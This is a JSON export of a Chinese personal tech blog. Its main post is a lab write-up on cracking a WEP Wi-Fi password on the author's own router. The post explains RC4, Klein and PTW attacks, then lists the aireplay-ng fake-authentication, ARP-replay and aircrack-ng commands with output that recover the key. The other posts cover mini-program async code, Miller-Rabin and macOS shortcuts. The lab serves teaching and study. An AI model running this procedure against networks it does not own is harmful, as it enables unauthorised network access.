{"meta":{"title":"Mirage's Blog","subtitle":"随心记录～","description":"越过山丘，才发现无人等候","author":"Mirage","url":"https://qilianshuo.github.io","root":"/"},"pages":[{"title":"分类","date":"2022-02-04T05:21:49.000Z","updated":"2022-02-04T05:22:24.616Z","comments":true,"path":"categories/index.html","permalink":"https://qilianshuo.github.io/categories/index.html","excerpt":"","text":""},{"title":"标签","date":"2022-02-04T05:20:53.000Z","updated":"2022-02-04T05:21:37.922Z","comments":true,"path":"tags/index.html","permalink":"https://qilianshuo.github.io/tags/index.html","excerpt":"","text":""},{"title":"友情链接","date":"2022-02-04T05:22:48.000Z","updated":"2022-02-04T05:23:23.314Z","comments":true,"path":"link/index.html","permalink":"https://qilianshuo.github.io/link/index.html","excerpt":"","text":""}],"posts":[{"title":"WEP口令实验","slug":"WEP口令实验","date":"2022-04-25T10:35:22.000Z","updated":"2022-04-25T10:47:52.593Z","comments":true,"path":"2022/04/25/WEP口令实验/","link":"","permalink":"https://qilianshuo.github.io/2022/04/25/WEP%E5%8F%A3%E4%BB%A4%E5%AE%9E%E9%AA%8C/","excerpt":"WEP Wi-Fi口令攻击实验实验目的 了解WEP认证协议流程和其安全缺陷。 掌握协议攻击原理和流密码的应用。 实验环境配置AP配置","text":"WEP Wi-Fi口令攻击实验实验目的 了解WEP认证协议流程和其安全缺陷。 掌握协议攻击原理和流密码的应用。 实验环境配置AP配置&emsp;&emsp;PHICOMM裴讯K2路由器，刷机华硕固件。AP加密模式为WEP- Open System，口令设置为WEPAttackTest。 攻击环境&emsp;&emsp;macOS Monterey主机 + Kali虚拟机 + USB外置网卡。 实验要求 通过arp欺骗获取口令（俗称密码） 编程实现WEP认证协议 解析口令获取的原理和过程 分析WAP认证协议如何抵抗该攻击方法 原理分析 WEP协议的安全性依赖于RC4加密算法的安全性，同时IEEE802.11协议的一些安全问题使攻击更容易完成。 RC4加密分析&emsp;&emsp;RC4的本质是流密码的异或加密，为了获取与明文等长的密钥流，使用了两个算法：Key Scheduling Algorithm(RC4-KSA)和Pseudo Random Generator Algorithm(PRGA)。 &emsp;&emsp;RC4使用一个长度为256的字节数组S，每次从中随机选择一位作为密钥流的一部分。可以看出密钥流的生成本质是随机数的生成，使用密钥作为初始种子，通过算法去不断迭代生成随机密钥流。 &emsp;&emsp;密钥调度算法KSA的处理过程如下： \\begin{aligned} &for \\quad i = 0 \\quad to \\quad{n-1} \\quad do\\\\ &\\quad S[i] = i\\\\ &end\\\\ &for \\quad i = 0 \\quad to \\quad{n-1} \\quad do\\\\ &\\quad j = RND(n)\\\\ &\\quad swap(S,i,j)\\\\ &end\\\\ \\end{aligned}&emsp;&emsp;伪随机数生成算法PRGA的处理过程如下： \\begin{aligned} &i=0\\\\ &j=0\\\\ &loop\\\\ &\\quad i = i + 1 \\mod n\\\\ &\\quad j = RND(n)\\\\ &\\quad swap(S,i,j)\\\\ &\\quad print \\ S[S[i]+S[j] \\mod n]\\\\ &end \\ loop\\\\ \\end{aligned}&emsp;&emsp;PRGA可以是一个无限长的循环，循环次数取决于需要加密的数据长度，每循环一次生成一位密钥字节，最终得到与明文等长的密钥流，与明文逐个字节进行异或处理，就得到了密文。 WEP认证分析&emsp;&emsp;为了使密钥具有随机性，WEP引入了初始向量initialization vector（IV），把IV添加到密钥头生成新的密钥，这样每次用来生成密钥流的随机种子都会不同，以增强协议的安全性。 STA向AP发送Authentication Request认证请求。 AP生成一个随机字符串(challenge)，明文发送给STA。 STA使用密钥加密challenge，把密文发给AP。 AP使用正确密钥解密STA发来的密文，如果解密后的数据和challenge相同，返回认证成功响应，否则返回失败响应。 编程模拟WEP认证过程 使用scapy库可以完成网卡发包，完全仿真WEP认证过程。由于没有充足的时间，暂时使用socket实现STA和AP间通信。 RC4.py — 完成RC4加密及解密 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849# -*- coding: UTF-8 -*-class RC4: n = 256 __S = [i for i in range(n)] __T = [] __K = list() l = 0 def __init__(self, key: str): self.__K = key.encode() self.l = len(self.__K) self._KSA() def _KSA(self) -&gt; None: j = 0 for i in range(self.n): j = (j + self.__S[i] + self.__K[i % self.l]) % self.n self.__S[i], self.__S[j] = self.__S[j], self.__S[i] def PRGA(self, length) -&gt; None: i = 0 j = 0 key_stream = [] self.__T = self.__S.copy() while length: i = (i + 1) % self.n j = (j + self.__T[i]) % self.n self.__T[i], self.__T[j] = self.__T[j], self.__T[i] k = (self.__T[i] + self.__T[j]) % self.n key_stream.append(self.__T[k]) length -= 1 return key_stream def encrypt(self, plaintext) -&gt; str: key_stream = self.PRGA(len(plaintext)) plain_stream = plaintext.encode() cipher = &#x27;&#x27; for i in range(len(plaintext)): cipher += hex(plain_stream[i] ^ key_stream[i]).upper()[2:].rjust(2, &#x27;0&#x27;) return cipher def decrypt(self, ciphertext: str) -&gt; str: cipher_byte = [int(ciphertext[i:i + 2], 16) for i in range(0, len(ciphertext), 2)] key_stream = self.PRGA(len(cipher_byte)) plain = &#x27;&#x27; for i in range(len(cipher_byte)): plain += chr(cipher_byte[i] ^ key_stream[i]) return plain STA.py — 模拟认证终端 123456789101112131415161718192021222324# -*- coding: UTF-8 -*-import socketfrom RC4 import RC4client = socket.socket()client.connect((&#x27;127.0.0.1&#x27;, 6968))rc4 = RC4(&#x27;Mirage&#x27;)# 1. 发起认证请求print(&#x27;1. Send AuthenticationRequest&#x27;)data = &quot;AuthenticationRequest&quot;client.send(bytes(data, encoding=&quot;utf-8&quot;))data = client.recv(1024)data = data.decode()# 2. 发送加密后的字符串if data.startswith(&#x27;AuthenticationChallenge&#x27;): challenge = data[23:] cipher = rc4.encrypt(challenge) print(&#x27;2. Use RC4 to encrypt the challenge:&#x27;, challenge) client.send(cipher.encode()) data = client.recv(1024) data = data.decode() print(&#x27;3.&#x27;, data) AP.py — 模拟AP路由 123456789101112131415161718192021222324252627282930313233343536373839404142# -*- coding: UTF-8 -*-from RC4 import RC4import randomimport socketdef random_generator(length: int) -&gt; str: return &#x27;&#x27;.join(random.sample( [&#x27;A&#x27;, &#x27;B&#x27;, &#x27;C&#x27;, &#x27;D&#x27;, &#x27;E&#x27;, &#x27;F&#x27;, &#x27;G&#x27;, &#x27;H&#x27;, &#x27;I&#x27;, &#x27;J&#x27;, &#x27;K&#x27;, &#x27;L&#x27;, &#x27;M&#x27;, &#x27;N&#x27;, &#x27;O&#x27;, &#x27;P&#x27;, &#x27;Q&#x27;, &#x27;R&#x27;, &#x27;S&#x27;, &#x27;T&#x27;, &#x27;U&#x27;, &#x27;V&#x27;, &#x27;W&#x27;, &#x27;X&#x27;, &#x27;Y&#x27;, &#x27;Z&#x27;, &#x27;0&#x27;, &#x27;1&#x27;, &#x27;2&#x27;, &#x27;3&#x27;, &#x27;4&#x27;, &#x27;5&#x27;, &#x27;6&#x27;, &#x27;7&#x27;, &#x27;8&#x27;, &#x27;9&#x27;], length ))rc4 = RC4(&#x27;Mirage&#x27;)server = socket.socket()server.bind((&quot;127.0.0.1&quot;, 6968))server.listen()tmp = dict()while True: con, addr = server.accept() while True: data = con.recv(1024) if not data: break data = data.decode() if data == &#x27;AuthenticationRequest&#x27;: challenge = random_generator(20) tmp[addr[0]] = challenge print(addr[0], challenge) con.send((&#x27;AuthenticationChallenge&#x27; + challenge).encode()) else: print(rc4.decrypt(data)) print(tmp.get(addr[0])) if rc4.decrypt(data) == tmp.get(addr[0]): print(str(addr), &#x27;AuthenticationResponseSuccess&#x27;) con.send(&#x27;AuthenticationResponseSuccess&#x27;.encode()) else: print(str(addr), &#x27;AuthenticationResponseFail&#x27;) con.send(&#x27;AuthenticationResponseFail&#x27;.encode()) 与RC4无关的攻击 认证攻击 攻击者通过捕获STA和AP之间交换的认证数据包，构造新的合法认证。aireplay-ng工具实现了该攻击，-1为该攻击模式。 数据包注入攻击 攻击者捕获WEP网络的数据包，一段时间后重放，分为普通注入和ARP注入。本次实验使用到大量ARP包，aireplay-ng工具的-3模式为ARP重放注入攻击。由于WEP协议没有重复IV过滤机制，导致只要抓到一个ARP请求，攻击者就可以大量复制该请求包并重放来抓取AP的ARP响应。 与RC4有关的攻击 FMS攻击、KoreK攻击 需要较多的计算资源，并未对WEP协议造成致命打击，不在此详细介绍。 Klein攻击 该攻击利用Jenkis关联，可以证明：$Prob(K[l] = S_l^{-1}(l - X[l-1] - j_l - S_l[l]) = q(2/n) + (1-q)((n-2)/n(n-1))$大约为$1.3676/n$，其中，$q=(1-1/n)^{n-2}$。 攻击形式为： F_{Klein}(K[0],K[1],\\cdots,K[l-1],X[l-1]) = S_l^{-1}[l-X[l-1]] - j_l - S_l[l] PTW攻击 PTW攻是WEP安全性的分水岭，在此之前的攻击要么因为需要大量数据包要么需要大量计算而具有较高的攻击门槛，而PTW攻击只需要使用几千到几万个ARP包并用少量的计算就能攻破密码。 该攻击的主要思想为由决定密钥单个字节改变决定$\\sigma_i = \\sum\\limits_{m=0}^iRk[m]$。 将Klein攻击扩展为2个密钥Byte的和。可以证明：$Prob(K[l]+K[l+1]=S_l^{-1}(l+1-X[l])-j_l-S_l[l]-S_l[l+1])$为$q_2((n-1)/n)^{n-2}(2/n)+(1-q_2((n-1)/n)^{n-2})((n-2)/n(n-1))$。其中，$q_2$为$((n-1)/n)^3$。 PTW2攻击形式为： F_{PTW2}(K[0],K[1],\\cdots,K[l-1],X[l]) = S_l^{-1}[l+1-X[l]] - j_l - S_l[l] - S_l[l+1] 继续扩展为m个密钥Byte的和。可以证明： Prob(\\sum_{a=l}^{l+m-1}K[a] = S_l^{-1}(l+m+1-X[l+m-2])-j_l-\\sum_{a=l}^{l+m-1}S_l[a])为$q_m((n-1)/n)^{n-2}(2/n)+(1-q_m((n-1)/n)^{n-2})((n-2)/n(n-1))$。其中，$q_m$为$(\\frac {n-1}{n})^{m-1}(\\frac{n-m+1}{n})\\mathop{\\Pi}\\limits_{a=1}^{m-1}(\\frac{n-a}{n})$。 PTW攻击形式为： F_{PTWm}(K[0],K[1],\\cdots,K[l-1],X[l+m-2]) = S_l^{-1}[l+m-1-X[l+m-2]] - j_l - \\sum\\limits_{a=l}^{l+m-1}S_l[a] 实验步骤确认目标 在MacOS上使用airport工具扫描附近AP，确认攻击目标所在信道。扫描命令为： 1airport -s 或在Kali中使用airodump-ng工具扫描，确认目标信道及MAC后再锁定网卡信道。 在kali虚拟机中将网卡开启监听模式，同时锁定目标信道。 1airmon-ng start wlan0 13 使用iwconfig命令确认网卡是否开启monitor模式。 测试注入可行性 -9 注入测试模式-e 目标ESSID-a 目标MAC 1234567891011┌──(root㉿kali)-[/home/kali/Desktop]└─# aireplay-ng -9 -e Mirage -a 74:7D:24:AC:83:C0 wlan0mon09:35:07 Waiting for beacon frame (BSSID: 74:7D:24:AC:83:C0) on channel 1309:35:07 Trying broadcast probe requests...09:35:07 Injection is working!09:35:09 Found 1 AP 09:35:09 Trying directed probe requests...09:35:09 74:7D:24:AC:83:C0 - channel: 13 - &#x27;Mirage&#x27;09:35:09 Ping (min/avg/max): 1.546ms/11.259ms/36.031ms Power: -42.6909:35:09 29/30: 96% 监听目标 使用airodump-ng抓包 -c 指定监听信道 —bssid 指定监听目标MAC -w 保存的抓包数据文件名 12345678910111213┌──(root㉿kali)-[/home/kali/Desktop]└─# airodump-ng -c 13 --bssid 74:7D:24:AC:83:C0 -w crackPKT wlan0mon09:57:34 Created capture file &quot;crackPKT-01.cap&quot;.CH 13 ][ Elapsed: 4 mins ][ 2022-04-23 10:01 ][ Are you sure you want to quit? Press Q agai BSSID PWR RXQ Beacons #Data, #/s CH MB ENC CIPHER AUTH ESSID 74:7D:24:AC:83:C0 -65 0 1621 35813 54 13 54e. WEP WEP OPN Mirage BSSID STATION PWR Rate Lost Frames Notes Probes 74:7D:24:AC:83:C0 D0:5A:FD:F0:4E:09 -18 1e- 1e 0 36064 74:7D:24:AC:83:C0 70:F1:1C:3D:6E:41 -60 6 - 1 3942 138117 重放注入攻击 使用aireplay-ng建立一个虚假认证。 -1 虚假认证攻击6000 每隔6000秒重新发起一次认证-o 1 每次认证只发送一个包， 默认发送多个-q 10 每隔10秒发送一次keep-alive请求 1234567891011┌──(root㉿kali)-[/home/kali/Desktop]└─# aireplay-ng -1 6000 -o 1 -q 10 -e Mirage -a 74:7D:24:AC:83:C0 -h 70:f1:1c:3d:6e:41 wlan0mon09:58:04 Waiting for beacon frame (BSSID: 74:7D:24:AC:83:C0) on channel 1309:58:04 Sending Authentication Request (Open System) [ACK]09:58:04 Authentication successful09:58:04 Sending Association Request09:58:04 Association successful :-) (AID: 1)09:58:14 Sending keep-alive packet [ACK] 09:58:24 Sending keep-alive packet [ACK] 开始ARP重放攻击，制造大量ARP请求 -3 ARP注入攻击模式 -b 目标MAC -h 本机MAC 123456┌──(root㉿kali)-[/home/kali/Desktop]└─# aireplay-ng -3 -b 74:7D:24:AC:83:C0 -h 70:f1:1c:3d:6e:41 wlan0mon 09:58:29 Waiting for beacon frame (BSSID: 74:7D:24:AC:83:C0) on channel 13Saving ARP requests in replay_arp-0423-095829.capYou should also start airodump-ng to capture replies.Read 194286 packets (got 73132 ARP requests and 42780 ACKs), sent 73276 packets...(499 pps) 破解密码 使用aircrack-ng解密捕获的数据包（默认使用PTW攻击破解，如需FMS/KoreK攻击使用-K参数） —bssid 需要解密的AP的BSSID 123456789101112131415161718192021222324252627282930313233┌──(root㉿kali)-[/home/kali/Desktop]└─# aircrack-ng --bssid 74:7D:24:AC:83:C0 crackPKT*.cap Reading packets, please wait...Opening crackPKT-01.capRead 257915 packets.1 potential targets Got 35812 out of 35000 IVsStarting PTW attack with 35812 ivs.Attack will be restarted every 5000 captured ivs. Aircrack-ng 1.6 [00:00:00] TesAircrack-ng 1.6 (got 30170 IVs) [00:00:00] Tested 1632001 keys (got 30170 IVs) KB depth byte(vote) [00:00:00] Tested 1785601 keys (got 30170 IVs) KB depth byte(vote)D[00:00:01] Tested 314088 keys (got 35812 IVs) KB depth byte(vote)DD(37376) 2B(37120) 43(36608) 0E(36096) 23(36096) CE(36096) KB depth byte(vote)DD(37376) 2B(37120) 43(36608) 0E(36096) 23(36096) CE(36096) 0 0/ 1 57(50176) 23(44800) E5(44544) 43(43776) D7(43776) DD(43520) 0E(43008) 1 0/ 1 45(46080) 84(42496) 86(42496) 94(41984) 83(41728) 2B(41472) 6A(41472) 2 0/ 1 50(52736) EB(45824) CA(44288) F9(43264) 17(42496) 85(42496) 8B(42496) 3 0/ 1 41(49408) EE(44288) 2E(43008) A7(43008) E7(42496) 34(42240) 30(41984) 4 0/ 1 74(54528) E7(44544) 73(43520) 64(43264) D7(43264) 9A(42496) AD(41728) 5 0/ 2 CD(44800) 15(44544) 70(41984) 89(41984) FC(41984) 80(41728) A1(41472) 6 0/ 1 61(46848) 04(44800) 51(43008) 01(42752) 81(41728) B9(41728) F4(41728) 7 0/ 1 63(46848) 3D(44544) 1A(43520) 9E(43520) 3B(42496) 5C(42496) 7B(42496) 8 0/ 1 6B(46336) DF(44032) CE(42496) 10(42240) 74(42240) 0B(41472) 4D(41472) 9 0/ 2 54(42496) 89(42496) 3F(42240) 7E(41984) 8C(41728) D2(41728) 07(41216) 10 5/ 1 C6(43008) 11(42496) A4(42240) F0(42240) 14(41984) CD(41984) 56(41728) 11 9/ 1 A0(40960) DA(40960) 20(40704) 82(40704) 28(40448) 6D(40448) 73(40448) 12 0/ 2 74(45172) 7E(45100) 82(44768) 98(43592) 3C(42896) 89(42536) 60(41988) KEY FOUND! [ 57:45:50:41:74:74:61:63:6B:54:65:73:74 ] (ASCII: WEPAttackTest ) Decrypted correctly: 100% 实验分析实验结果&emsp;&emsp;经测试，在捕捉到大量数据包的情况下，对于13位的字母密钥，PTW攻击只用了几秒钟便成功破解，在ARP重放攻击下，捕获这些数据包也仅仅用了几分钟。 &emsp;&emsp;WEP引入IV本意是增强协议安全性，但反倒可以根据IV和猜测到的明文数据反推出部分密钥流，从而更容易地攻破密码。 分析WPA改进The Temporal Key Integrity Protocol（TKIP）&emsp;&emsp;临时密钥完整性协议（TKIP）可以被视为WEP的一个经过大量修改的版本。TKIP仍然使用RC4流密码，但比WEP安全得多。TKIP的设计目标并不是一个尽可能安全的协议。取而代之的是对WEP的修改，它可以防止所有已知的攻击，提供相当高的安全级别，并且可以在大多数现有硬件上使用，只需安装驱动程序或固件更新。 替换RC4为AES&emsp;&emsp;AES密码可以在计数器模式counter mode(CCMP)下用于加密网络传输并保护器完整性。这完全取代了RC4流密码算法，并提供了非常高的安全级别。目前，AES中还没有已知的可实现弱点。 密钥管理&emsp;&emsp;IEEE 802.11增加了企业级密钥管理，允许多种认证模式。STA不再需要一个单独的秘密预共享密钥，而是需要用户名和密码、智能卡、证书、硬件密码器和其他身份验证协议。除了广播， 每个站点都使用单独的密钥与接入点通信，因此同一网络中的另一个站点不再可能进行窃听。 参考文献 Attacks on the WEP protocol A. Klein. Attacks on the RC4 stream cipher. Designs, Codes and Cryptography, 48(3):269–286, 2008. 密码分析学——深度分析WEP密钥恢复攻击（PTW攻击）","categories":[],"tags":[{"name":"密码","slug":"密码","permalink":"https://qilianshuo.github.io/tags/%E5%AF%86%E7%A0%81/"}]},{"title":"Android抓包总结","slug":"Android抓包整理归纳","date":"2022-03-26T14:42:36.000Z","updated":"2022-03-26T15:18:58.884Z","comments":true,"path":"2022/03/26/Android抓包整理归纳/","link":"","permalink":"https://qilianshuo.github.io/2022/03/26/Android%E6%8A%93%E5%8C%85%E6%95%B4%E7%90%86%E5%BD%92%E7%BA%B3/","excerpt":"","text":"持续记录更新中～🚀 最初接触Android抓包，是需要root的抓包精灵。之后在Windows上使用了很久的Fiddler，并了解到FD也能代理抓包Android，被FD简洁且强大的功能吸引。再之后到现在，使用最多的是HttpCanary，在Android平台上面去了windows代理的麻烦，而且劫持注入等功能也很强大。但是从Android11开始，软件的证书安装出现问题，本来以为作者会尽快修复bug，提供证书导出手动安装功能，但到现在Android12软件闪退，11上的证书问题依旧没有解决。遂决定写文总结之前的抓包经历，以及之后如何优雅地抓包。 使用过的抓包工具 抓包精灵（Packet Capture） wicap抓包工具 Fiddler HttpCanary","categories":[{"name":"逆向","slug":"逆向","permalink":"https://qilianshuo.github.io/categories/%E9%80%86%E5%90%91/"}],"tags":[{"name":"抓包","slug":"抓包","permalink":"https://qilianshuo.github.io/tags/%E6%8A%93%E5%8C%85/"}]},{"title":"小程序async-await同异步问题","slug":"小程序async-await同异步问题","date":"2022-03-15T15:41:44.000Z","updated":"2022-03-21T08:55:02.158Z","comments":true,"path":"2022/03/15/小程序async-await同异步问题/","link":"","permalink":"https://qilianshuo.github.io/2022/03/15/%E5%B0%8F%E7%A8%8B%E5%BA%8Fasync-await%E5%90%8C%E5%BC%82%E6%AD%A5%E9%97%AE%E9%A2%98/","excerpt":"不熟悉node开发和小程序，某次小项目遇到一些异步问题，在此记录📝。 1. 调用异步函数崩溃😡123exports.userLogin = async (uname, password) =&gt; &#123; //pass&#125; 描述：在utils.js中写了userLogin函数，在login/login.js登陆页的login函数中调用，直接崩溃。如下： 12345login: function () &#123; //…… let cookies = userLogin(phone_number, password); //……&#125;","text":"不熟悉node开发和小程序，某次小项目遇到一些异步问题，在此记录📝。 1. 调用异步函数崩溃😡123exports.userLogin = async (uname, password) =&gt; &#123; //pass&#125; 描述：在utils.js中写了userLogin函数，在login/login.js登陆页的login函数中调用，直接崩溃。如下： 12345login: function () &#123; //…… let cookies = userLogin(phone_number, password); //……&#125; 后了解到async必须和await一起使用，遂更改代码为： 1let cookies = await userLogin(phone_number, password); 仍然崩溃，因为login不是异步函数，这时解决方法有两种，第一种是更改login的函数类型，加上async修饰；另一种是用异步函数把异步语句包裹从而和login分离。 1234567891011//方法一login: aysync function () &#123; let cookies = userLogin(phone_number, password);&#125;//方法二login: function () &#123; !async function () &#123; let cookies = userLogin(phone_number, password); &#125; ()&#125; 2. wx.request() success 回调同步🤕wx.request为异步函数，请求成功后触发success`回调，无法把请求数据传出。 最开始使用了一种非常笨拙且不优雅的方式传出数据：页面的data数据字典，通过在回调函数中that.setData()存储数据，然后在外部使用this.data.…取出数据。 后面实在无法忍受这种不方便的写法，找到了Promise的解决方案。使用resolve()把数据传出，但需要在前面加上await来等待异步request执行完毕，不然只会得到Promise对象。 12345678910let resp = await new Promise((resolve) =&gt; &#123; wx.request(&#123; url: URL, method: METHOD, header: &#123;&#125;, success: res =&gt; &#123; resolve(res.data) &#125; &#125;)&#125;) 3. wx.request success 回调中添加异步过程🥴原始代码如下： 1234567async function testFun () &#123; wx.request(&#123; success: res =&gt; &#123; let a = await …… &#125; &#125;)&#125; 本以为wx.request的外层函数被async修饰，可以添加await同步，但上面代码报错again。 解决方法是用async修饰success的回调函数： 1234567async function testFun () &#123; wx.request(&#123; success: async function (res) &#123; let a = await …… &#125; &#125;)&#125; 暂时记不起更多问题了，日后追更～（希望永远不要更新）(◐‿◑)","categories":[{"name":"踩坑记录📝","slug":"踩坑记录📝","permalink":"https://qilianshuo.github.io/categories/%E8%B8%A9%E5%9D%91%E8%AE%B0%E5%BD%95%F0%9F%93%9D/"}],"tags":[{"name":"小程序","slug":"小程序","permalink":"https://qilianshuo.github.io/tags/%E5%B0%8F%E7%A8%8B%E5%BA%8F/"},{"name":"js异步","slug":"js异步","permalink":"https://qilianshuo.github.io/tags/js%E5%BC%82%E6%AD%A5/"}]},{"title":"Miller-Rabin素数测试算法","slug":"Miller-Rabin素数测试算法","date":"2022-03-15T10:42:01.000Z","updated":"2022-03-21T08:53:44.921Z","comments":true,"path":"2022/03/15/Miller-Rabin素数测试算法/","link":"","permalink":"https://qilianshuo.github.io/2022/03/15/Miller-Rabin%E7%B4%A0%E6%95%B0%E6%B5%8B%E8%AF%95%E7%AE%97%E6%B3%95/","excerpt":"学习RSA过程中用到了大素数，记录学习过程。 目前没有算法能够直接生成一个素数（据本人了解），只能通过不断生成随机数直到产生素数的方法来生成。如果$n$较小，可以直接对$2$到$\\sqrt{n}$ 的所有整数取模验证，但当$n$特别大时，$O(\\sqrt{n})$ 复杂度耗费的大量时间是不能被接受的。此时如果牺牲部分准确度来换取时间的优化，即Miller-Rabin算法的思想。 根据百度百科，使用快速幂运算，这个算法的时间复杂度是 $O(𝑘\\log^3𝑛)$ ，判错概率\u0005是$4^{-k}$，$k$为判断次数。下面为该算法的实现原理。 引理1. 费马小定理","text":"学习RSA过程中用到了大素数，记录学习过程。 目前没有算法能够直接生成一个素数（据本人了解），只能通过不断生成随机数直到产生素数的方法来生成。如果$n$较小，可以直接对$2$到$\\sqrt{n}$ 的所有整数取模验证，但当$n$特别大时，$O(\\sqrt{n})$ 复杂度耗费的大量时间是不能被接受的。此时如果牺牲部分准确度来换取时间的优化，即Miller-Rabin算法的思想。 根据百度百科，使用快速幂运算，这个算法的时间复杂度是 $O(𝑘\\log^3𝑛)$ ，判错概率\u0005是$4^{-k}$，$k$为判断次数。下面为该算法的实现原理。 引理1. 费马小定理如果$p$是素数，且 $gcd(a, p) = 1$ ，则有 $a^{p-1}\\equiv 1 \\pmod {p}$ 。 它的逆命题并不能推出$p$为素数，但如果不满足 $a^{p-1} \\equiv 1 \\pmod {p}$ 的$p$一定是合数。 2. 有限域上的平方根定理如果$p$是一个奇质数，且 $e \\geq 1$ ，则方程 x^2 \\equiv 1 \\pmod {p^e}仅有两个根 $x=1$ 或者 $x=-1$ ，$\\pm1$也称为1的平凡平方根。 在 $e=1$ 即模$p$的情况下，$x=-1$等价于$x=p-1$ 。 把 $x = 1$ 和 $x = p-1$ 称为“$x$对模$p$来说1的平凡平方根”不太通顺，Miller-Rabin索性测试用到这个方程：$x^2 \\equiv 1 \\pmod {n}$ 。如果一个数$x$满足方程$x^2 \\equiv 1 \\pmod {𝑛}$，但$x$不等于平凡平方根1或$n-1$ ，那么称$x$是对模n来说1的“非平凡”平方根。例如，$x=6$ , $n=35$ ，6是对模35来说1的非平凡平方根。 推论：如果对模n存在1的非平凡平方根，则n是合数。 Miller-Rabin算法判断一个大数n是否为素数时，可以利用上面的费马小定理 $a^{n-1} \\equiv 1 \\pmod {n}$ ，如果不满足该式，则可断定n为合数。但在该判断前可以用引理2的推理进一步增强准确性。 对于偶数$n-1$ ，一定可以拆分为 $n-1 = 2 ^ s * d$ ： a ^ {n-1} = a ^ {2 ^ {s} * d} = (((a^d)^2)\\cdots)^2从$x=a^d$开始，依次平方s次，每次平方的时候模n。由有限域上的平方根定理可知，如果模n时结果为1，那么$x$一定是1或者$n-1$，如果不满足则n为合数。如果$x$为1的平凡平方根或模n的结果不为1，$x = x^2$继续下一次平方，然后模n判断。 当平方到了s次，此时$x = a ^ {n-1}$ ，判断$x$模n的结果是否为1。如果不为1判定n为合数，如果为1则可认为n大概率为素数。 算法的代码实现 在进行$a^{d} \\pmod n$ 和 $x^2 \\pmod n$时如果直接运算，大概率会溢出，所以需要使用快速幂和快速乘。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;typedef long long ll;ll qMul(ll a, ll b, ll mod);ll qPow(ll base, ll power, ll mod);int Miller_Rabin(ll n, int repeat);int main() &#123; ll n; while (printf(&quot;Input a n to judge:\\n&quot;) &amp;&amp; scanf(&quot;%lld&quot;, &amp;n) != EOF) &#123; printf(Miller_Rabin(n, 10) ? &quot;Yes\\n\\n&quot; : &quot;No\\n\\n&quot;); &#125; return 0;&#125;//quick multiplyll qMul(ll a, ll b, ll mod) &#123; ll ret = 0; while (b) &#123; if (b &amp; 1) ret = (ret + a) % mod; a = (a + a) % mod; b &gt;&gt;= 1; &#125; return ret;&#125;//quick powerll qPow(ll base, ll power, ll mod) &#123; ll ret = 1; while (power) &#123; if (power &amp; 1) ret = qMul(ret, base, mod); base = qMul(base, base, mod); power &gt;&gt;= 1; &#125; return ret % mod;&#125;int Miller_Rabin(ll n, int repeat) &#123; if (n == 2 || n == 3) return 1; if (n % 2 == 0 || n == 1) return 0; ll d = n - 1; int s = 0; while (!(d &amp; 1)) ++s, d &gt;&gt;= 1; for (int i = 0; i &lt; repeat; i++) &#123; ll a = rand() % (n - 3) + 2; ll x = qPow(a, d, n); ll y = 0; for (int j = 0; j &lt; s; j++) &#123; y = qMul(x, x, n); if (y == 1 &amp;&amp; x != 1 &amp;&amp; x != (n - 1)) return 0; x = y; &#125; if (y != 1) return 0; &#125; return 1;&#125;","categories":[{"name":"算法","slug":"算法","permalink":"https://qilianshuo.github.io/categories/%E7%AE%97%E6%B3%95/"}],"tags":[{"name":"素数","slug":"素数","permalink":"https://qilianshuo.github.io/tags/%E7%B4%A0%E6%95%B0/"},{"name":"算法","slug":"算法","permalink":"https://qilianshuo.github.io/tags/%E7%AE%97%E6%B3%95/"}]},{"title":"RSSI定位算法学习","slug":"RSSI定位算法学习","date":"2022-03-01T10:20:08.000Z","updated":"2022-03-21T08:53:15.164Z","comments":true,"path":"2022/03/01/RSSI定位算法学习/","link":"","permalink":"https://qilianshuo.github.io/2022/03/01/RSSI%E5%AE%9A%E4%BD%8D%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0/","excerpt":"","text":"K最近邻居法 DV-Hop法 质心定位算法 加权质心定位算法 三边定位算法 AOA定位算法 TOA/TDOA算法","categories":[{"name":"学习笔记","slug":"学习笔记","permalink":"https://qilianshuo.github.io/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"RSSI","slug":"RSSI","permalink":"https://qilianshuo.github.io/tags/RSSI/"},{"name":"定位","slug":"定位","permalink":"https://qilianshuo.github.io/tags/%E5%AE%9A%E4%BD%8D/"}]},{"title":"mac OS快捷键","slug":"mac-OS快捷键","date":"2022-02-14T08:16:03.000Z","updated":"2022-03-21T08:55:56.300Z","comments":true,"path":"2022/02/14/mac-OS快捷键/","link":"","permalink":"https://qilianshuo.github.io/2022/02/14/mac-OS%E5%BF%AB%E6%8D%B7%E9%94%AE/","excerpt":"🍀持续更新中～ 文稿快捷键⌘ + ↑：文稿开头 ⌘ + ↓：文稿末尾 ⌘ + → ：行首（Home）","text":"🍀持续更新中～ 文稿快捷键⌘ + ↑：文稿开头 ⌘ + ↓：文稿末尾 ⌘ + → ：行首（Home） ⌘ + ← ：行尾（End） ⌥ + ← ：单词首 ⌥ + →： 单词尾 ⌃ + A：行或段落开头 ⌃ + E：行或段落末尾 ⌃ + F：向前一字符 ⌃ + B：向后一字符 ⌃ + N：下一行 ⌃ + P：上一行 Mac修饰键样式 ⇪ Caps Lock ⌘ Command ⌥ Option ⇧ Shift ⌃ Control","categories":[{"name":"学习笔记","slug":"学习笔记","permalink":"https://qilianshuo.github.io/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"Mac OS","slug":"Mac-OS","permalink":"https://qilianshuo.github.io/tags/Mac-OS/"},{"name":"快捷键","slug":"快捷键","permalink":"https://qilianshuo.github.io/tags/%E5%BF%AB%E6%8D%B7%E9%94%AE/"}]},{"title":"Safari正则兼容问题记录","slug":"Safari正则兼容问题记录","date":"2022-02-13T05:05:32.000Z","updated":"2022-03-21T08:52:59.787Z","comments":true,"path":"2022/02/13/Safari正则兼容问题记录/","link":"","permalink":"https://qilianshuo.github.io/2022/02/13/Safari%E6%AD%A3%E5%88%99%E5%85%BC%E5%AE%B9%E9%97%AE%E9%A2%98%E8%AE%B0%E5%BD%95/","excerpt":"Halo某主题代码渲染出现问题，查看控制台发现报错如下： 定位到错误代码： 12345var reg = new RegExp(&quot;(?&lt;=]).+(?=\\\\[/)&quot;, &quot;g&quot;);var noway = new RegExp(&quot;(?=\\\\[noway])(\\\\S*)(\\\\[/noway]=?)&quot;, &quot;g&quot;);var buy = new 